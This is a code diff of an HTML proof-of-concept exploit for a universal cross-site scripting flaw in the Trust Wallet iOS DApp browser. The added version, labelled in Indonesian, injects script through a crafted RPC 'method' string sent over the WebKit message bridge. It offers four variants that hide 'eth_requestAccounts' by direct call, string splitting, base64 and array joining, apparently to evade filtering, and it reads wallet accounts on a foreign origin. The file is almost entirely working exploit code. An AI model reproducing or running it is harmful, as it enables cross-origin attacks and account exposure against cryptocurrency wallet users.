@@ -1,35 +1,127 @@
 <!doctype html>
-<html lang="en"><head><meta charset="utf-8">
-<title>Trust Wallet iOS RPC UXSS PoC</title></head><body>
-<a id="run" href="https://google.com/">RUN</a>
-<pre id="status">PoC</pre>
-<script>
-'use strict';
-const runLink = document.querySelector('#run');
-const status  = document.querySelector('#status');
-const target  = 'https://google.com/';
-// Harmless dummy — proves origin only, requests nothing sensitive:
-const impact = [
-  '(async()=>{',
-  String.raw`if(!/(^|\.)google\.com$/.test(location.hostname))return;`,
-  'if(window.__twUxss)return;window.__twUxss=1;',
-  "document.body?.insertAdjacentHTML('afterbegin','<h1 id=tw-uxss>PWNED BY BADCAT</h1>');",
-  'alert(document.domain);',   // shows google.com when boundary is broken
-  '})();'
-].join(' ');
-const marker = `zz_");${impact}//`;
-runLink.addEventListener('click', e => {
-  e.preventDefault();
-  const bridge = window.webkit?.messageHandlers?._tw_;
-  if(!bridge?.postMessage || !window.trustwallet?.ethereum){
-    status.textContent='Open in Trust Wallet iOS 26.38.20 DApp browser.';return;
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>TW RPC Bypass Test</title>
+</head>
+<body>
+  <h3>Trust Wallet RPC Bypass Test</h3>
+  <button id="btnA" onclick="testA()">Versi A - Direct</button><br><br>
+  <button id="btnB" onclick="testB()">Versi B - String Split</button><br><br>
+  <button id="btnC" onclick="testC()">Versi C - Base64</button><br><br>
+  <button id="btnD" onclick="testD()">Versi D - Array Join</button><br><br>
+  <pre id="status">Pilih versi untuk test...</pre>
+
+  <script>
+  'use strict';
+
+  const status = document.querySelector('#status');
+  const target = 'https://google.com/';
+
+  function getMarker(impact) {
+    return `zz_");${impact.join(' ')}//`;
   }
-  const baseId = Math.trunc(Date.now()%9e15);
-  for(let i=0;i<8;i++){
-    bridge.postMessage({id:baseId+i,network:'ethereum',name:'rpcCall',
-      object:{method:marker,params:[],jsonrpc:'2.0'}});
+
+  function sendToBridge(marker, label) {
+    const bridge = window.webkit?.messageHandlers?._tw_;
+    if (!bridge?.postMessage || !window.trustwallet?.ethereum) {
+      status.textContent = '❌ Buka di Trust Wallet iOS!';
+      return;
+    }
+
+    const baseId = Math.trunc(Date.now() % 9e15);
+    let sent = 0;
+
+    for (let i = 0; i < 8; i++) {
+      try {
+        bridge.postMessage({
+          id: baseId + i,
+          network: 'ethereum',
+          name: 'rpcCall',
+          object: {
+            method: marker,
+            params: [],
+            jsonrpc: '2.0'
+          }
+        });
+        sent++;
+      } catch(e) {
+        status.textContent = `❌ ${label} gagal di request ${i+1}: ${e.message}`;
+        return;
+      }
+    }
+
+    status.textContent = `✅ ${label}: ${sent} request dikirim!\nNavigasi ke ${target}...`;
+    setTimeout(() => location.assign(target), 120);
   }
-  status.textContent='RPC sent; navigating to '+target;
-  setTimeout(()=>location.assign(target),120);
-},{once:true});
-</script></body></html>
+
+  // Versi A - Direct eth_requestAccounts
+  function testA() {
+    const impact = [
+      '(async()=>{',
+      String.raw`if(!/(^|\.)google\.com$/.test(location.hostname))return;`,
+      'if(window.__twA)return;window.__twA=1;',
+      "document.body?.insertAdjacentHTML('afterbegin','<h1>PWNED-A</h1>');",
+      'alert(document.domain);',
+      'const p=window.ethereum;',
+      "const a=await p.request({method:'eth_requestAccounts'});",
+      'alert("Accounts:"+JSON.stringify(a));',
+      '})();'
+    ];
+    sendToBridge(getMarker(impact), 'Versi A (Direct)');
+  }
+
+  // Versi B - String Split
+  function testB() {
+    const impact = [
+      '(async()=>{',
+      String.raw`if(!/(^|\.)google\.com$/.test(location.hostname))return;`,
+      'if(window.__twB)return;window.__twB=1;',
+      "document.body?.insertAdjacentHTML('afterbegin','<h1>PWNED-B</h1>');",
+      'alert(document.domain);',
+      'const p=window.ethereum;',
+      "const m='eth_'+'requestAccounts';",
+      'const a=await p.request({method:m});',
+      'alert("Accounts:"+JSON.stringify(a));',
+      '})();'
+    ];
+    sendToBridge(getMarker(impact), 'Versi B (String Split)');
+  }
+
+  // Versi C - Base64
+  function testC() {
+    // eth_requestAccounts in base64 = ZXRoX3JlcXVlc3RBY2NvdW50cw==
+    const impact = [
+      '(async()=>{',
+      String.raw`if(!/(^|\.)google\.com$/.test(location.hostname))return;`,
+      'if(window.__twC)return;window.__twC=1;',
+      "document.body?.insertAdjacentHTML('afterbegin','<h1>PWNED-C</h1>');",
+      'alert(document.domain);',
+      'const p=window.ethereum;',
+      "const m=atob('ZXRoX3JlcXVlc3RBY2NvdW50cw==');",
+      'const a=await p.request({method:m});',
+      'alert("Accounts:"+JSON.stringify(a));',
+      '})();'
+    ];
+    sendToBridge(getMarker(impact), 'Versi C (Base64)');
+  }
+
+  // Versi D - Array Join
+  function testD() {
+    const impact = [
+      '(async()=>{',
+      String.raw`if(!/(^|\.)google\.com$/.test(location.hostname))return;`,
+      'if(window.__twD)return;window.__twD=1;',
+      "document.body?.insertAdjacentHTML('afterbegin','<h1>PWNED-D</h1>');",
+      'alert(document.domain);',
+      'const p=window.ethereum;',
+      "const m=['eth','requestAccounts'].join('_');",
+      'const a=await p.request({method:m});',
+      'alert("Accounts:"+JSON.stringify(a));',
+      '})();'
+    ];
+    sendToBridge(getMarker(impact), 'Versi D (Array Join)');
+  }
+  </script>
+</body>
+</html>
